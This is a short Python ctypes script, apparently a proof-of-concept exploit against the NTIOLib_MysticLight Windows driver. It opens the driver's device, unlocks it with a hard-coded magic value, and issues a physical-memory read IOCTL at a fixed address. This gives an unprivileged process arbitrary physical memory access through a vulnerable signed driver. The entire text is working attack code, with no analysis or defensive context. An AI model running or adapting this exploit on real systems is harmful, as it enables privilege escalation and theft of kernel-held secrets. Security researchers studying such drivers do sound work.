import ctypes
from ctypes import wintypes
import struct

kernel32 = ctypes.windll.kernel32

GENERIC_READ = 0x80000000
GENERIC_WRITE = 0x40000000
OPEN_EXISTING = 3

IOCTL_SET_MAGIC_HEX = 0xc350214c
IOCTL_READ_PHYSICAL = 0xc3506104
MAGIC_HEX = 0x2f405a34

device = kernel32.CreateFileW(
    "\\\\.\\NTIOLib_MysticLight",
    GENERIC_READ | GENERIC_WRITE,
    0,
    None,
    OPEN_EXISTING,
    0,
    None
)

if device == -1:
    exit(1)

magic_hex_buffer = struct.pack("<I", MAGIC_HEX)
kernel32.DeviceIoControl(device, IOCTL_SET_MAGIC_HEX, magic_hex_buffer, 4, None, 0, None, None)

physical_address = 0x00000000000c0000
input_buffer = struct.pack("<Q", physical_address) + struct.pack("<I", 0) + struct.pack("<I", 0)

output_buffer = ctypes.create_string_buffer(16)
bytes_returned = wintypes.DWORD()

kernel32.DeviceIoControl(
    device,
    IOCTL_READ_PHYSICAL,
    input_buffer,
    16,
    output_buffer,
    16,
    ctypes.byref(bytes_returned),
    None
)

kernel32.CloseHandle(device)